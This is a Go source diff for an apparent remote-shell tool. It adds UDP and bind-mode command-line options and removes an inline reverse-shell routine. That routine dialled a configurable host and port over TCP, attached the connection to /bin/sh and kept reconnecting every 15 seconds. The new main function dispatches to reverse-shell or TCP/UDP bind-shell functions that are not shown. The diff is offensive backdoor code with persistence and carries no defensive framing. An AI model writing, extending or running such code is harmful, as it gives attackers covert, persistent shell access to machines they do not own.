@@ -1,7 +1,6 @@
 package main
 
 import (
-	"net"
 	"time"
     "flag"
 )
@@ -9,41 +8,39 @@ import (
 type Config struct {
 	Address 	string
 	Shell		string
-	OS			string
+	Proto		string
 	Reconnect 	time.Duration
 }
 
 func main() {
 	var config Config
 	var host, port, reconnect string
+	var udp, bind bool
 
     flag.StringVar(&host, "host", "127.0.0.1", "Host")
 	flag.StringVar(&port, "port", "1234", "Port")
 	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Unix Shell")
+	flag.BoolVar(&udp, "u", false, "Enable UDP")
+	flag.BoolVar(&bind, "l", false, "Bind mode")
 	flag.StringVar(&reconnect, "recon", "15s", "Reconnecting Time")
     flag.Parse()
 
 	config.Address = host + ":" + port
 	config.Reconnect, _ = time.ParseDuration(reconnect)
 
-	ReverseShell(config)
-}
-
-func ReverseShell(config Config) {
-	conn, err := net.Dial("tcp", config.Address)
-	if err != nil {
-		if conn != nil {
-			conn.Close()
-		}
-
-		Reconnect(config)
+	if udp {
+		config.Proto = "udp"
+	} else {
+		config.Proto = "tcp"
 	}
 
-	Shell(conn, config)
-	Reconnect(config)
-}
-
-func Reconnect(config Config) {
-	time.Sleep(config.Reconnect)
-	ReverseShell(config)
+	if bind {
+		if udp {
+			UDPBind(config)
+		} else {
+			TCPBind(config)
+		}
+	} else {
+		ReverseShell(config)
+	}
 }
